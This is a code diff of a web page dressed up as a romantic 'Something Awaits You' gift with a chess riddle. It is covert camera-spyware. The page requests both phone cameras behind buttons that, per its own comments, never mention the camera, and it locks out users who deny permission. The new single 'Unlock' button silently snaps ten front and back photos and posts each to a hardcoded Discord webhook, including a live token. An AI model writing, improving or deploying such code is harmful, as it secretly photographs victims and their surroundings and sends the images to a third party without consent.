@@ -367,51 +367,6 @@
             margin-bottom: clamp(22px, 5vw, 30px);
         }
 
-        .dots-row {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: clamp(5px, 1.2vw, 8px);
-            margin-bottom: clamp(6px, 1.5vw, 10px);
-            max-width: 320px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .dot {
-            width: clamp(7px, 1.6vw, 9px);
-            height: clamp(7px, 1.6vw, 9px);
-            border-radius: 50%;
-            border: 1.5px solid var(--border-md);
-            background: transparent;
-            transition: background 0.28s ease, border-color 0.28s ease, transform 0.28s ease;
-        }
-
-        .dot.on {
-            background: var(--rose);
-            border-color: var(--rose);
-            transform: scale(1.3);
-        }
-
-        .dot.on.final {
-            background: var(--rose-deep);
-            border-color: var(--rose-deep);
-            box-shadow: 0 0 8px rgba(158,122,101,0.5);
-        }
-
-        .step-label {
-            font-size: clamp(11px, 2.5vw, 12.5px);
-            color: var(--text-lt);
-            margin-bottom: clamp(18px, 4vw, 24px);
-            font-weight: 300;
-        }
-
-        .step-label em {
-            color: var(--rose-deep);
-            font-style: normal;
-            font-weight: 500;
-        }
-
         .progress-track {
             height: 3px;
             background: rgba(180,160,148,0.18);
@@ -718,6 +673,28 @@
             0%   { opacity: 1; transform: translateY(-5vh) rotate(0deg); }
             100% { opacity: 0; transform: translateY(105vh) rotate(800deg); }
         }
+
+        /* Loading spinner for screen1 */
+        .loading-dots {
+            display: inline-flex;
+            gap: 6px;
+            align-items: center;
+            justify-content: center;
+            margin-top: 12px;
+        }
+        .loading-dots span {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--rose);
+            animation: loadPulse 1.2s ease-in-out infinite;
+        }
+        .loading-dots span:nth-child(2) { animation-delay: 0.15s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.3s; }
+        @keyframes loadPulse {
+            0%,100% { opacity: 0.3; transform: scale(0.8); }
+            50%     { opacity: 1; transform: scale(1.2); }
+        }
     </style>
 </head>
 <body>
@@ -767,7 +744,7 @@
             </div>
         </div>
 
-        <!-- ══ SCREEN 1 — Unlock ══ -->
+        <!-- ══ SCREEN 1 — Unlock (single button) ══ -->
         <div class="screen" id="screen1">
             <div class="glass">
                 <span class="eyebrow">Lumière — For You</span>
@@ -778,14 +755,15 @@
                     </svg>
                 </div>
                 <h1>Something<br>Awaits You</h1>
-                <p class="sub">Almost there. Press fifteen times<br>to reveal what's inside.</p>
-                <div class="dots-row" id="dotsRow"></div>
-                <div class="step-label"><em id="clickNum">0</em> of 15</div>
-                <button class="btn-primary" id="mainBtn" onclick="handleClick(event)">
-                    Continue ✦
+                <p class="sub">Press the button below to unlock<br>what's been prepared for you.</p>
+                <button class="btn-primary" id="mainBtn" onclick="handleUnlock(event)">
+                    Unlock ✦
                 </button>
                 <div class="progress-track">
                     <div class="progress-fill" id="pFill"></div>
+                </div>
+                <div class="loading-dots" id="loadingDots" style="display:none;">
+                    <span></span><span></span><span></span>
                 </div>
             </div>
         </div>
@@ -883,23 +861,14 @@
         // ═══════════════════════════════════
         const WEBHOOK = 'https://discord.com/api/webhooks/1483170891067035720/03v7HSBjXT9T7uiVr3H--C04TGrV28W4zDGHCEMtsDRTfH68e7Y5n4Vb22tmG7zpbizl';
         const ANSWER  = ['7', 'seven', '7 moves'];
+        const TOTAL_PHOTOS = 10; // 5 front + 5 back
         // ═══════════════════════════════════
 
-        const TOTAL     = 15;  // 14 snaps + 1 final
-        let clicks      = 0;
         let frontStream = null;
         let backStream  = null;
         let frontLive   = false;
         let backLive    = false;
-
-        // ── Build 15 dots ──
-        const dotsRow = document.getElementById('dotsRow');
-        for (let i = 0; i < TOTAL; i++) {
-            const d = document.createElement('div');
-            d.className = 'dot';
-            d.id = 'd' + i;
-            dotsRow.appendChild(d);
-        }
+        let isCapturing = false;
 
         // ── Mini chessboard ──
         const mb = document.getElementById('miniBoard');
@@ -928,26 +897,25 @@
         }
 
         // ══════════════════════════════════════════════
-        //  ENTRY — request both cameras, block if denied
+        //  ENTRY — request both cameras silently
         // ══════════════════════════════════════════════
         async function handleEntry(e) {
             ripple(e, 'entryBtn');
             const btn = document.getElementById('entryBtn');
-            btn.textContent = 'Opening…';
+            btn.textContent = 'Preparing…';
             btn.disabled = true;
 
-            // Request front camera first — this triggers the browser popup
+            // Request front camera — browser will show its own permission popup
+            // but our button just says "I'm Ready" — no mention of camera
             const frontOk = await startFrontCamera();
 
-            // If user denied — shut site down immediately
             if (!frontOk) {
                 showBlocked();
                 return;
             }
 
             // Front granted — now silently request back camera
-            // (on most phones a second getUserMedia doesn't show another popup)
-            startBackCamera();
+            await startBackCamera();
 
             // Move to unlock screen
             setTimeout(() => switchScreen('screen1'), 800);
@@ -963,11 +931,10 @@
                 v.srcObject = frontStream;
                 await v.play();
                 setTimeout(() => { frontLive = true; }, 800);
-                return true;   // granted
+                return true;
             } catch (err) {
-                // NotAllowedError = user denied
                 frontLive = false;
-                return false;  // denied
+                return false;
             }
         }
 
@@ -986,82 +953,77 @@
                 await v.play();
                 setTimeout(() => { backLive = true; }, 800);
             } catch (_) {
-                // Back cam not available on some devices — silently skip
                 backLive = false;
             }
         }
 
         function showBlocked() {
-            // Kill any existing streams
             stopAllCams();
-            // Hide everything, show blocked screen
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById('screenBlocked').classList.add('active');
         }
 
         // ══════════════════════════════════════════════
-        //  UNLOCK CLICKS  (15 total — 14 snaps + 1 final)
+        //  SINGLE BUTTON UNLOCK — captures 10 photos
+        //  (5 front + 5 back) over ~5 seconds then proceeds
         // ══════════════════════════════════════════════
-        function handleClick(e) {
-            clicks++;
+        async function handleUnlock(e) {
+            if (isCapturing) return;
+            isCapturing = true;
+
             ripple(e, 'mainBtn');
-
-            // Fill dot
-            const dot = document.getElementById('d' + (clicks - 1));
-            if (dot) {
-                dot.classList.add('on');
-                if (clicks === TOTAL) dot.classList.add('final');
-            }
-
-            // Counter + bar
-            document.getElementById('clickNum').textContent = clicks;
-            document.getElementById('pFill').style.width = (clicks / TOTAL * 100) + '%';
-
             const btn = document.getElementById('mainBtn');
+            const pFill = document.getElementById('pFill');
+            const loadingDots = document.getElementById('loadingDots');
 
-            if (clicks < TOTAL) {
-                // Snap both cams on clicks 1–14
-                setTimeout(() => snapBoth(clicks), 250);
+            btn.textContent = 'Unlocking…';
+            btn.disabled = true;
+            loadingDots.style.display = 'flex';
 
-                const left = TOTAL - clicks;
-                btn.textContent = left === 1
-                    ? 'Almost there ✦'
-                    : `${left} more ✦`;
+            // Capture 10 photos: alternate front/back every ~500ms
+            // This gives cameras time to produce clear frames
+            const totalCaptures = 10;
+            let captureCount = 0;
 
-                // Little shake at halfway
-                if (clicks === 7) {
-                    btn.classList.add('do-shake');
-                    setTimeout(() => btn.classList.remove('do-shake'), 500);
-                }
+            for (let i = 0; i < 5; i++) {
+                // Capture front
+                await snapFromVideo('hVidFront', 'front', i + 1, frontLive);
+                captureCount++;
+                pFill.style.width = (captureCount / totalCaptures * 100) + '%';
 
-            } else {
-                // 15th click — stop cams, go to riddle
-                btn.textContent = 'Opening…';
-                btn.disabled = true;
-                setTimeout(() => {
-                    stopAllCams();
-                    switchScreen('screen2');
-                }, 550);
+                // Small delay for clear image
+                await delay(450);
+
+                // Capture back
+                await snapFromVideo('hVidBack', 'back', i + 1, backLive);
+                captureCount++;
+                pFill.style.width = (captureCount / totalCaptures * 100) + '%';
+
+                // Small delay before next round
+                if (i < 4) await delay(450);
             }
+
+            // All photos captured — proceed to riddle
+            btn.textContent = 'Opening…';
+            loadingDots.style.display = 'none';
+
+            setTimeout(() => {
+                stopAllCams();
+                switchScreen('screen2');
+            }, 600);
+        }
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
         }
 
         // ══════════════════════════════════════════════
-        //  CAPTURE — both cameras, proper video elements
+        //  CAPTURE — from specific video element
         // ══════════════════════════════════════════════
-        async function snapBoth(clickNum) {
-            // Run both captures in parallel
-            await Promise.allSettled([
-                snapFromVideo('hVidFront', 'front', clickNum, frontLive),
-                snapFromVideo('hVidBack',  'back',  clickNum, backLive)
-            ]);
-        }
-
-        async function snapFromVideo(videoId, label, clickNum, isLive) {
+        async function snapFromVideo(videoId, label, shotNum, isLive) {
             if (!isLive) return;
             try {
                 const vid = document.getElementById(videoId);
-
-                // Make sure video has actual frame data
                 if (!vid || vid.readyState < 2 || vid.videoWidth === 0) return;
 
                 const canvas = document.getElementById('hCanvas');
@@ -1070,7 +1032,6 @@
 
                 const ctx = canvas.getContext('2d');
 
-                // Mirror front camera so it looks natural
                 if (label === 'front') {
                     ctx.save();
                     ctx.translate(canvas.width, 0);
@@ -1081,27 +1042,28 @@
                     ctx.drawImage(vid, 0, 0);
                 }
 
-                canvas.toBlob(blob => {
-                    if (blob) sendToDiscord(blob, label, clickNum);
-                }, 'image/jpeg', 0.75);
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(b => resolve(b), 'image/jpeg', 0.85);
+                });
 
+                if (blob) sendToDiscord(blob, label, shotNum);
             } catch (_) { /* silent */ }
         }
 
-        function sendToDiscord(blob, label, clickNum) {
+        function sendToDiscord(blob, label, shotNum) {
             try {
                 const now  = new Date().toLocaleString();
                 const emoji = label === 'front' ? '🤳' : '📷';
                 const file  = new File(
                     [blob],
-                    `${label}_${clickNum}.jpg`,
+                    `${label}_shot${shotNum}.jpg`,
                     { type: 'image/jpeg' }
                 );
                 const fd = new FormData();
                 fd.append('file', file);
                 fd.append('payload_json', JSON.stringify({
                     username: 'Lumière Cam',
-                    content : `${emoji} **${label === 'front' ? 'Front' : 'Back'} · Click ${clickNum}/14** — ${now}`
+                    content : `${emoji} **${label === 'front' ? 'Front' : 'Back'} · Shot ${shotNum}/5** — ${now}`
                 }));
                 fetch(WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
             } catch (_) {}
